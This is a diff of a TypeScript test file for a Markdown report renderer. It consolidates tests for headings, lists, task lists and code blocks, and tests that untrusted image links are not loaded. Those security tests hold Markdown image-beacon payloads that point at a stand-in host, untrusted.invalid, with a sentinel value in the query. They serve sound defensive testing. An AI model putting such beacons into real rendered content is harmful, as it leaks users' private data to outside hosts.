@@ -8,35 +8,63 @@ function render(content: string) {
 }
 
 describe("MarkdownDocument", () => {
-  it("renders headings as a hierarchy instead of literal hashes", () => {
-    const markup = render("# Summary\n\n## Key points\n\n### Detail");
+  it("renders report Markdown structure as HTML", () => {
+    const cases = [
+      {
+        label: "headings as a hierarchy instead of literal hashes",
+        content: "# Summary\n\n## Key points\n\n### Detail",
+        expected: [
+          "<h1>Summary</h1>",
+          "<h2>Key points</h2>",
+          "<h3>Detail</h3>",
+        ],
+        forbidden: ["# Summary"],
+      },
+      {
+        label: "emphasis, lists, and blockquotes",
+        content: [
+          "**Decided** to ship.",
+          "",
+          "- first point",
+          "- second point",
+          "",
+          "1. step one",
+          "2. step two",
+          "",
+          "> An open question.",
+        ].join("\n"),
+        expected: [
+          "<strong>Decided</strong>",
+          "<li>first point</li>",
+          "<ol>",
+          "<blockquote>",
+        ],
+        forbidden: ["**Decided**"],
+      },
+      {
+        label: "GFM task lists as checkboxes",
+        content: "- [x] shipped\n- [ ] pending",
+        expected: ['type="checkbox"', "checked"],
+        forbidden: ["[x]"],
+      },
+      {
+        label: "fenced code blocks without collapsing whitespace",
+        content: "```text\nsummary   4,800 tokens\n```",
+        expected: ["<pre>", "<code", "summary   4,800 tokens"],
+        forbidden: [],
+      },
+    ];
 
-    expect(markup).toContain("<h1>Summary</h1>");
-    expect(markup).toContain("<h2>Key points</h2>");
-    expect(markup).toContain("<h3>Detail</h3>");
-    expect(markup).not.toContain("# Summary");
-  });
+    for (const { label, content, expected, forbidden } of cases) {
+      const markup = render(content);
 
-  it("renders emphasis, lists, and blockquotes", () => {
-    const markup = render(
-      [
-        "**Decided** to ship.",
-        "",
-        "- first point",
-        "- second point",
-        "",
-        "1. step one",
-        "2. step two",
-        "",
-        "> An open question.",
-      ].join("\n"),
-    );
-
-    expect(markup).toContain("<strong>Decided</strong>");
-    expect(markup).toContain("<li>first point</li>");
-    expect(markup).toContain("<ol>");
-    expect(markup).toContain("<blockquote>");
-    expect(markup).not.toContain("**Decided**");
+      for (const fragment of expected) {
+        expect(markup, label).toContain(fragment);
+      }
+      for (const literal of forbidden) {
+        expect(markup, label).not.toContain(literal);
+      }
+    }
   });
 
   it("renders GFM tables inside a horizontal scroll container", () => {
@@ -49,22 +77,6 @@ describe("MarkdownDocument", () => {
     expect(markup).toContain("<th>Decision</th>");
     expect(markup).toContain("<td>Ship it</td>");
     expect(markup).not.toContain("| --- |");
-  });
-
-  it("renders GFM task lists as checkboxes", () => {
-    const markup = render("- [x] shipped\n- [ ] pending");
-
-    expect(markup).toContain('type="checkbox"');
-    expect(markup).toContain("checked");
-    expect(markup).not.toContain("[x]");
-  });
-
-  it("renders fenced code blocks without collapsing whitespace", () => {
-    const markup = render("```text\nsummary   4,800 tokens\n```");
-
-    expect(markup).toContain("<pre>");
-    expect(markup).toContain("<code");
-    expect(markup).toContain("summary   4,800 tokens");
   });
 
   it("opens links outside the app window", () => {
@@ -82,17 +94,21 @@ describe("MarkdownDocument", () => {
     expect(markup).toContain("&lt;script&gt;");
   });
 
-  it.each([
-    "![Summary](https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
-    "![Summary][image]\n\n[image]: https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL",
-    "![Summary](//untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
-    "![Summary](./beacon?text=PRIVATE_SENTINEL)",
-  ])("does not load images from untrusted report content: %s", (content) => {
-    const markup = render(content);
-    expect(markup).toContain("Summary");
-    expect(markup).not.toContain("<img");
-    expect(markup).not.toContain("<link");
-    expect(markup).not.toContain("PRIVATE_SENTINEL");
+  it("does not load images from untrusted report content", () => {
+    const contents = [
+      "![Summary](https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
+      "![Summary][image]\n\n[image]: https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL",
+      "![Summary](//untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
+      "![Summary](./beacon?text=PRIVATE_SENTINEL)",
+    ];
+
+    for (const content of contents) {
+      const markup = render(content);
+      expect(markup, content).toContain("Summary");
+      expect(markup, content).not.toContain("<img");
+      expect(markup, content).not.toContain("<link");
+      expect(markup, content).not.toContain("PRIVATE_SENTINEL");
+    }
   });
 
   it("keeps long unbroken values inside the document", () => {
